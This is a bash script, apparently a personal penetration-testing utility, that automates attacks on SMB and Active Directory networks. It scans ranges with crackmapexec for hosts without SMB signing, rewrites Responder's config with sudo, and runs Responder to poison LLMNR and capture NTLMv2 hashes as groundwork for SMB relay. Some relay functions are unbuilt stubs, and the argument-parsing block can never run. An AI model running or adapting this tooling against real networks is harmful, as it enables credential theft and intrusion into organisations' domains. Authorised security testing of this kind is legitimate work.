#!/bin/bash -i

# DEPENDENCIES 
# Responder 
# Crackmapexec
# nmap 

############################################################
# Help                                                     #
############################################################
Help()
{
   # TODO - update this 
   # Display Help
   echo "SMB/Active Directory Utility Tool"
   echo
   echo "Syntax: scriptTemplate [-g|h|v|V]"
   echo "options:"
   echo "r     Print the GPL license notification."
   echo "h     Print Help Manual."
   echo "v     Verbose mode."
   echo "V     Print software version and exit."
   echo
}

############################################################
# Functions                                                #
############################################################
Find_smb_signing()
{	
	
	#TODO - put output in cleaned format to a targets.txt file
	echo "[+] Starting crackmapexec on range $Range...."
	echo "[+] outputting Targets with message signing not required or disabled to targets.txt"
	if [ -f "targets.txt" ]; then
		mv targets.txt targets_old.txt
	else
		touch targets.txt
	fi
	# Scan target range using crackmapexec to check for SMB signing and output only targets 
	# with signing not required or completely disabled 
	crackmapexec smb $Range --gen-relay-list targets.txt
	

}

Change_ip_range()
{	
	# TODO - add support for multiple IP ranges (make range an array)
	# Updates the IP range variable
	echo "Insert new IP range or specific IP (i.e 192.168.1.0/24)"
	read answer 
	Range=$answer
}

Llmr_poisoning()
{	
	# modify the responder config file for LLMR poisoning 
	sudo sed -i 's/SMB = Off/SMB = On/' /etc/responder/Responder.conf
	sudo sed -i 's/HTTP = Off/HTTP = On/' /etc/responder/Responder.conf
	# Check if log files exists and if it does, move the old one 
	if [ -f "llmr_log.txt" ]; then
		mv llmr_log.txt llmr_log_old.txt
	else	
		touch llmr_log.txt
	fi
	# Run responder to capture NTLMv2 Hashes
	echo "[+] Starting Responder...."
	echo "[+] listening for hashes and outputting them to llmr_log.txt...."
	sudo responder -I $Adapter -dwv | tee llmr_log.txt
}

Smb_relay_hash_capture()
{
	#  Check if a targets.txt file exists. if it does not, find targets not requiring smb signing
	if [ -f "targets.txt" ]; then
		echo "[+] found targets.txt, relaying to targets:"
		cat targets.txt
	else
		echo "[+] No targets.txt found, finding targets for range $Range ....."
		Find_smb_signing
	fi
	# modify the responder config file for for SMB relay
	sudo sed -i 's/SMB = On/SMB = Off/' /etc/responder/Responder.conf
	sudo sed -i 's/HTTP = On/HTTP = Off/' /etc/responder/Responder.conf
	# Run responder and ntlmrelayx
	echo "[+] Starting Responder, in a seperate terminal run this script and select whether to catch the SAM hash dump or attempt to catch an interactive shell."
	echo 
	sudo responder responder -I $Adapter -dwv
}

Smb_relay_shell()
{	# TODO - build this
	echo "test"	
}

Smb_relay_samhash()
{	#TODO - build this 
	echo "test"
}
############################################################
############################################################
# Main program                                             #
############################################################
############################################################
#TODO - update help section 
#TODO - Make option show all options every time 
#TODO - Scan for common SMB vulnerabilities 
#TODO - SMB relay for hash catching - change smb and http to off in responder.conf
#TODO - SMB relay for interactive shell - change smb and http to on in responder.conf
#TODO - Crack NLTMv2 Hashes w/ HashCat 
#TODO - change adapter

echo "SMB and Active Directory Swiss Army Knife - Adam Petersen 2022-2023"
echo "Utility tool for faster exploiting and enumerating of SMB and AD."
echo "Enter Network adapter to be used:"
read Adapter
echo "Enter IP range for enumeration:"
read Range

while true; do
	clear
	OPTIONS="smb_signing update_ip_range llmr_poison smb_relay_hash quit"
	select opt in $OPTIONS; do
		if [ "$opt" = "smb_signing" ]; then
			Find_smb_signing
		elif [ "$opt" = "update_ip_range" ]; then
			Change_ip_range
		elif [ "$opt" = "llmr_poison" ]; then
			Llmr_poisoning
		elif [ "$opt" = "quit" ]; then
			echo quitting
			exit
		elif [ "$opt" = "smb_relay_hash" ]; then
			Smb_relay_hash_capture
		else
			clear
			echo bad option
		fi
	done
done



############################################################
# Process the input options. Add options as needed.        #
############################################################
# TODO - make this work lol - pass in arguments 
while getopts ":hr:" option; do
   case $option in
      h) # display Help
         Help
         exit;;
     \?) # Invalid option
         echo "Error: Invalid option"
         exit;;
   esac
done
